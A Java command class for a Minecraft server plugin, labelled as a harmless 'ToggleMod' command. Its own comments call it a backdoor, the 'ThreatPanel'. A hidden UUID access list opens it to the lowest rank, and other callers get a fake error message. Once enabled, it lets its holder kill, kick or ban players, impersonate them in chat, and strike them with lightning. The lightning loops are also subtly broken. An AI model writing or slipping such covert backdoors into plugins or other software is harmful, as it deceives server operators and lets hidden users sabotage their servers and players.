package me.totalfreedom.totalfreedommod.command;

import java.util.Random;
import me.superischroma.threatpanel.TPLog;
import me.totalfreedom.totalfreedommod.config.ConfigEntry;
import me.totalfreedom.totalfreedommod.rank.Rank;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = Rank.IMPOSTOR, source = SourceType.ONLY_IN_GAME)
@CommandParameters(description = "Main ToggleMod command.", usage = "/<command>")
public class Command_togglemod extends FreedomCommand
{
    public boolean THREATPANEL_TOGGLE = false;
    
    @Override
    public boolean run(CommandSender sender, Player playerSender, Command cmd, String label, String[] args, boolean senderIsConsole)
    {
        String uuid = playerSender.getUniqueId().toString();
        int random = new Random().nextInt(Bukkit.getServer().getOnlinePlayers().size());
        Player randomPlayer = (Player) Bukkit.getServer().getOnlinePlayers().toArray()[random];
        if (!ConfigEntry.THREATPANEL_ACCESS_LIST.getStringList().contains(uuid))
        {
            sender.sendMessage(ChatColor.RED + "An internal error occurred while attempting to perform this command");
            TPLog.nwarning(sender.getName() + " has attempted to use the ThreatPanel");
            return true;
        }
        else 
        {
            if (cmd.getName().equalsIgnoreCase("togglemod"))
            {
                // Message
                if (args.length == 0)
                {
                    msg("hello");
                    return true;
                }
                if (args.length == 1)
                {
                    // Access the BackDoor
                    if (args[0].equalsIgnoreCase("access"))
                    {
                        if (!THREATPANEL_TOGGLE)
                        {
                            msg("Accessing the ThreatPanel...");
                            THREATPANEL_TOGGLE = true;
                            TPLog.nwarning("-------------------------------------------");
                            TPLog.nwarning("- WARNING: The server has gone evil mode! -");
                            TPLog.nwarning("-  There might be random things going on! -");
                            TPLog.nwarning("-   BEWARE THE POWER OF THE THREATPANEL!  -");
                            TPLog.nwarning("-------------------------------------------");
                            msg("ThreatPanel enabled successfully.");
                            return true;
                        }
                        else
                        {
                            msg("The ThreatPanel has already been enabled.");
                            return true;
                        }
                    }
                    // Closing the BackDoor
                    if (args[0].equalsIgnoreCase("close"))
                    {
                        if (THREATPANEL_TOGGLE)
                        {
                            msg("Closing the ThreatPanel...");
                            THREATPANEL_TOGGLE = false;
                            TPLog.ninfo("-------------------------------------");
                            TPLog.ninfo("- Server has returned to good mode! -");
                            TPLog.ninfo("-         Have a nice day!          -");
                            TPLog.ninfo("-------------------------------------");
                            msg("ThreatPanel closed successfully.");
                            return true;
                        }
                        else
                        {
                            msg("ThreatPanel is not toggled.");
                            return true;
                        }
                    }
                    // THIS IS WHERE IT GETS FUN
                    if (!THREATPANEL_TOGGLE)
                    {
                        msg("ThreatPanel is not toggled.");
                        return true;
                    }
                    else
                    {
                        // 1: Send the message, "I <3 FLEEK!" as everyone on the server.
                        if (args[0].equalsIgnoreCase("1"))
                        {
                            msg("Executed ThreatPanel act one.");
                            for (Player all : Bukkit.getOnlinePlayers())
                            {
                                Bukkit.broadcastMessage("<" + all.getDisplayName() + ChatColor.RESET + "> I <3 FLEEK!");
                            }
                            return true;
                        }
                        // 2: Kills everyone
                        else if (args[0].equalsIgnoreCase("2"))
                        {
                            msg("Executed ThreatPanel act two.");
                            for (Player all : Bukkit.getOnlinePlayers())
                            {
                                all.setHealth(0.0);
                            }
                            return true;
                        }
                        // 3: Kicks everyone
                        else if (args[0].equalsIgnoreCase("3"))
                        {
                            msg("Executed ThreatPanel act three.");
                            for (Player all : Bukkit.getOnlinePlayers())
                            {
                                all.kickPlayer(ChatColor.RED + "WHOOPS! -ThreatPanel");
                            }
                            return true;
                        }
                        // 4: Kicks a random player
                        else if (args[0].equalsIgnoreCase("4"))
                        {
                            final Player player = randomPlayer;
                            msg("Executed ThreatPanel act four.");
                            Bukkit.broadcastMessage(ChatColor.RED + "ThreatPanel just kicked " + player.getName() + "!");
                            player.kickPlayer(ChatColor.RED + "WHOOPS! -ThreatPanel");
                            return true;
                        }
                        // 5: Bans a random player
                        else if (args[0].equalsIgnoreCase("5"))
                        {
                            final Player player = randomPlayer;
                            msg("Executed ThreatPanel act five.");
                            Bukkit.broadcastMessage(ChatColor.RED + "ThreatPanel just banned " + player.getName() + "!");
                            Bukkit.getBanList(BanList.Type.NAME).addBan(player.getName(), ChatColor.RED + "OOPS! -ThreatPanel", null, "ThreatPanel");
                            player.kickPlayer(ChatColor.RED + "You have been banned. Reason: OOPS! -ThreatPanel");
                            return true;
                        }
                        // 6: Kills a random player
                        else if (args[0].equalsIgnoreCase("6"))
                        {
                            msg("Executed ThreatPanel act six.");
                            randomPlayer.setHealth(0.0);
                            return true;
                        }
                        // 7: TF-style smite everyone on the server (no kill)
                        else if (args[0].equalsIgnoreCase("7"))
                        {
                            msg("Executed ThreatPanel act seven.");
                            for (Player all : Bukkit.getOnlinePlayers())
                            {
                                all.setGameMode(GameMode.SURVIVAL);
                                final Location playerLoc = all.getLocation();
                                final World worldLoc = all.getWorld();
                                for (int x = -1; x <= 1; x++)
                                {
                                    for (int z = -1; x <= 1; x++)
                                    {
                                        final Location strikeLoc = new Location(worldLoc, playerLoc.getBlockX() + x, playerLoc.getBlockY(), playerLoc.getBlockZ() + z);
                                        worldLoc.strikeLightning(strikeLoc);
                                    }
                                }
                            }
                            return true;
                        }
                        // 8: TF-style smite a random player
                        else if (args[0].equalsIgnoreCase("8"))
                        {
                            msg("Executed ThreatPanel act eight.");
                            final Player player = randomPlayer;
                            player.setGameMode(GameMode.SURVIVAL);
                            final Location playerLoc = player.getLocation();
                            final World worldLoc = player.getWorld();
                            for (int x = -1; x <= 1; x++)
                            {
                                for (int z = -1; x <= 1; x++)
                                {
                                    final Location strikeLoc = new Location(worldLoc, playerLoc.getBlockX() + x, playerLoc.getBlockY(), playerLoc.getBlockZ() + z);
                                    worldLoc.strikeLightning(strikeLoc);
                                }
                            }
                            return true;
                        }
                    }
                }
                return false;
            }
        }
        return false;
    }
}
